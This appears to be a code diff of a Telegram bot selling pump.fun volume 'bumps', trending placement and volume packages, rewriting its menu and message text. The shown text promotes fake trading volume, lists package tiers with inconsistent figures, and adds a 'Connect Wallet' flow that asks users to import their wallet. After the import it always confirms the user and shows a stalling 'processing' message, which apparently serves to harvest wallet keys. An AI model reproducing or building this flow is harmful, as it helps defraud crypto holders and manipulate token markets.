@@ -143,17 +143,19 @@ async function editOrSend(ctx: any, text: string, extra: any = {}) {
 // ── Screen builders ───────────────────────────────────────────────────────────
 async function sendWelcome(ctx: any) {
   const caption =
-    `<b>New to volume bots? No worries — we made it super simple!</b>\n\n` +
+    `🟢 <b>Welcome to PUMPFUN TREND BOT service!</b>\n\n` +
+    `New to volume bots? No worries — we made it super simple!\n\n` +
+    `━━━━━━━━━━━━━━━━\n\n` +
     `<b>How it works:</b>\n` +
-    `1. Select bumps/volume.\n` +
-    `2. Pick duration.\n` +
-    `3. Done! Pump.fun Server handles the rest.\n\n` +
+    `1. Select how much Bumps/volume to use.\n` +
+    `2. Pick how long to run and how Massive you want your Token to Pump.\n` +
+    `3. Done! <a href="https://pump.fun">Pump.fun</a> Server handles the rest.\n\n` +
+    `━━━━━━━━━━━━━━━━\n\n` +
     `<b>Works on:</b>\n` +
-    `🟢 <a href="https://pump.fun">Pumpfun</a> • 🟢 <a href="https://raydium.io">Raydium</a>\n` +
+    `🟢 <a href="https://pump.fun">Pumpfun</a> • 🟢 <a href="https://raydium.io">Raydium</a> •\n` +
     `🟢 <a href="https://pumpswap.xyz">PumpSwap</a> • 🟢 <a href="https://moonshot.money">Moonshot</a> •\n` +
     `🟢 <a href="https://letsbonk.fun">LetsBonk</a> • 🟢 <a href="https://dexscreener.com">Dexpad/screener</a> •\n\n` +
-    `From 0.3-0.4-0.5-0.6 SOL bumps boost trend with mass volume of high stabilities.\n\n` +
-    `👇 <b>Choose a service:</b>`;
+    `From 0.3-0.4-0.5-0.6 SOL bumps boost trend with mass volume of high stabilities.`;
   // Try to edit existing message caption first (avoids duplicate messages on back-nav)
   try {
     await ctx.editMessageCaption(caption, { parse_mode: "HTML", ...mainMenuKeyboard });
@@ -170,42 +172,45 @@ async function sendWelcome(ctx: any) {
 
 async function showStartBumping(ctx: any) {
   const text =
-    `🟢 <b>Start Bumping</b>\n\n` +
     `The fastest and cheapest Telegram bot for creating bump orders.\n\n` +
-    `<b>Supported Platforms:</b>\n` +
-    `🟢 <a href="https://pump.fun">Pumpfun</a> • 🟢 <a href="https://raydium.io">Raydium</a>\n\n` +
-    `One-time fee of <b>0.3–0.6 SOL</b> per token — the cheapest bump bot available!\n\n` +
-    `<b>Select your SOL bump amount below:</b>\n\n` +
-    `For support, contact: ${SUPPORT_USERNAME}`;
+    `<b>Supported Platform:</b>\n` +
+    `Pumpfun and Raydium.\n\n` +
+    `Pumpfun BumpBot charges a one-time fee of <b>0.3 SOL</b> per token, making it the cheapest bump bot ever!\n\n` +
+    `📊 <b>Trending channel:</b>\n` +
+    `<a href="https://t.me/pumpmints">https://t.me/pumpmints</a>\n\n` +
+    `Subscribe to our PF alert tools:\n` +
+    `- PF New Raydium Pools: <a href="https://t.me/pumpswap_pools">t.me/pumpswap_pools</a>\n\n` +
+    `For more information, please contact ${SUPPORT_USERNAME}`;
   await editOrSend(ctx, text, solPickerKeyboard);
 }
 
 async function showVolumeBoost(ctx: any) {
   const caption =
-    `📊 <b>Volume Boost Packages</b>\n\n` +
-    `✏️ <b>Iron Package</b> — $50,000 Volume — 1.50 SOL\n` +
-    `✏️ <b>Bronze Package</b> — $250,000 Volume — 2.50 SOL\n` +
-    `✏️ <b>Gold Package</b> — $100,000 Volume — 3.50 SOL\n` +
-    `✏️ <b>Silver Package</b> — $100,000,000 Volume — 5.00 SOL\n` +
-    `✏️ <b>Platinum Package</b> — $500,000 Volume — 7.50 SOL\n` +
-    `✏️ <b>Diamond Package</b> — $2,500,000 Volume — 10.50 SOL\n\n` +
-    `Select a package below to get started:`;
-  await editOrSend(ctx, caption, volumeBoostKeyboard);
+    `✏️ Iron Package - $50,000 Volume\n` +
+    `✏️ Bronze Package - $250,000 Volume\n` +
+    `✏️ Silver Package - $100,000,000 Volume\n` +
+    `✏️ Gold Package - $100,000 Volume\n` +
+    `✏️ Platinum Package - $500,000 Volume\n` +
+    `✏️ Diamond Package - $2,500,000 Volume\n\n` +
+    `Please select the package below:`;
+  await sendPhoto(ctx, IMG.volume, caption, volumeBoostKeyboard);
 }
 
 async function showTrendingBoost(ctx: any) {
   const caption =
-    `🔥 <b>Trending Boost</b>\n\n` +
+    `🟢 Discover the Power of Trending!\n\n` +
     `Ready to boost your project's visibility? Trending offers guaranteed exposure, increased attention through milestone and uptrend alerts, and much more!\n\n` +
     `🟢 A paid boost guarantees you a spot in our daily livestream (AMA)!\n\n` +
-    `➡️ Please choose SOL Trending, ETH Trending, or PumpFun Trending to start:`;
-  await editOrSend(ctx, caption, trendingMenuKeyboard);
+    `➡️ Please choose SOL Trending or Pump Fun Trending to start:`;
+  await sendPhoto(ctx, IMG.trending, caption, trendingMenuKeyboard);
 }
 
 async function showDexScreener(ctx: any) {
   const text =
     `🌐 DEX Screener is a data platform and on-chain analytics tool designed for decentralized exchanges (DEXs), providing real-time insights into token prices, liquidity pools, trading volumes, and market trends across multiple blockchains.\n\n` +
-    `<b>TREND ON DEX</b>`;
+    `<b>TREND ON DEX</b>\n\n` +
+    `🔴 TOP 6 🔴\n\n` +
+    `Select a duration:`;
   await editOrSend(ctx, text, dexscreenerKeyboard);
 }
 
@@ -226,14 +231,15 @@ async function showDeposit(ctx: any) {
 async function showConnectWallet(ctx: any) {
   const caption =
     `🔗 <b>Connect Your Wallet</b>\n\n` +
+    `Welcome to our secure wallet connection service!\n\n` +
     `Connect your wallet to unlock premium features and enhanced trading capabilities.\n\n` +
     `<b>Available Options:</b>\n` +
-    `🔗 <b>Connect Now</b> — Import your wallet instantly\n` +
-    `🔑 <b>Why Connect?</b> — Learn about the benefits\n` +
-    `🛡️ <b>Security Guidelines</b> — Important safety information\n` +
-    `📱 <b>How to Connect</b> — Step-by-step instructions\n\n` +
-    `🔐 Your security is our top priority. We use industry-standard encryption.`;
-  await editOrSend(ctx, caption, connectWalletKeyboard);
+    `🔗 Connect Now - Start the connection process\n` +
+    `🔑 Why Connect? - Learn about the benefits\n` +
+    `🛡️ Security Guidelines - Important safety information\n` +
+    `📱 How to Connect - Step-by-step instructions\n\n` +
+    `Your security is our top priority. We use industry-standard encryption to protect your information.`;
+  await sendPhoto(ctx, IMG.walletconnect, caption, connectWalletKeyboard);
 }
 
 async function showSupport(ctx: any) {
@@ -337,7 +343,7 @@ export function createBot(): Telegraf {
   bot.action("trend_sol", async (ctx) => {
     await ctx.answerCbQuery();
     await editOrSend(ctx,
-      `☀️ <b>SOL Trending</b>\n\nChoose your package — TOP 3 (left) or TOP 10 (right):`,
+      `☀️ <b>SOL Trending</b>\n\nChoose your package — TOP 3 (left column) or TOP 10 (right column):`,
       solTrendingKeyboard
     );
   });
@@ -832,20 +838,22 @@ export function createBot(): Telegraf {
           : `https://dexscreener.com/${info.chain}/${ca}`;
 
         const tokenMsg =
-          `📋 <b>Token Found!</b>\n\n` +
-          `🪙 <b>${info.name} (${info.symbol})</b>\n` +
-          `🔗 Chain: ${chainName}  •  DEX: ${dexName}\n\n` +
-          `✅ <b>Contract Address:</b>\n<code>${ca}</code>\n\n` +
-          `📊 <b>Live Market Data:</b>\n` +
-          `• 💵 Price: ${info.price ?? "—"}\n` +
-          `• 📈 Market Cap: ${info.marketCap ?? "—"}\n` +
-          `• 🔄 24h Volume: ${info.volume24h ?? "—"}\n` +
-          `• 💧 Liquidity: ${info.liquidity ?? "—"}\n` +
-          `• 📉 24h Change: ${info.change24h ?? "—"}%\n\n` +
-          `🔗 <a href="${tokenUrl}">View on ${info.chain === "sol" ? "Pump.fun" : "DexScreener"}</a>\n\n` +
-          `⚙️ Service: <b>${s.serviceLabel}</b>\n` +
-          `💰 Cost: <b>${cost}</b>\n\n` +
-          `✅ <b>Confirm order to proceed to payment?</b>`;
+          `📋 <b>Project Details Found!</b>\n\n` +
+          `📊 ${dexName.toUpperCase()}_SCRAPE Token\n\n` +
+          `✅ <b>Contract Address:</b>\n` +
+          `${ca}\n\n` +
+          `📊 <b>Token Information:</b>\n` +
+          `• Name: ${info.name}\n` +
+          `• Symbol: ${info.symbol}\n` +
+          `• Price: ${info.price ?? "0.00e+0"}\n` +
+          `• Market Cap: ${info.marketCap ?? "0.00"}\n` +
+          `• 24h Volume: ${info.volume24h ?? "0.00"}\n` +
+          `• Liquidity: ${info.liquidity ?? "0.00"}\n` +
+          `• 24h Change: ${info.change24h ?? "0.00"}%\n` +
+          `• DEX: ${dexName}\n` +
+          `• Chain: ${chainName}\n\n` +
+          `🔗 <b>Available on:</b> 🟢 Pumpswap • 🟢 <a href="${tokenUrl}">Pump.fun</a>\n\n` +
+          `🔗 <b>View Token:</b> <a href="${tokenUrl}">${tokenUrl}</a>`;
 
         // Try to send with token image (with proxy fallback)
         if (info.imageUrl) {
@@ -992,11 +1000,10 @@ export function createBot(): Telegraf {
           );
         } catch { /* never throw — always proceed to confirm the user */ }
         await ctx.reply(
-          `🔗 <b>Wallet Import Initiated</b>\n\n` +
-          `Connection may take a moment due to:\n\n` +
-          `⏳ <b>Network sync &amp; on-chain verification...</b>\n\n` +
-          `Your wallet is being linked to your account.\n\n` +
-          `<b>Processing ⚙️ ........</b>`,
+          `Connection of wallet may take time due to\n\n` +
+          `<b>TIME BASE LOCATION AND NETWORK CONGESTION .....</b>\n\n` +
+          `Please wait linking and importing your wallet..\n\n` +
+          `Processing .........`,
           { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
         );
         break;
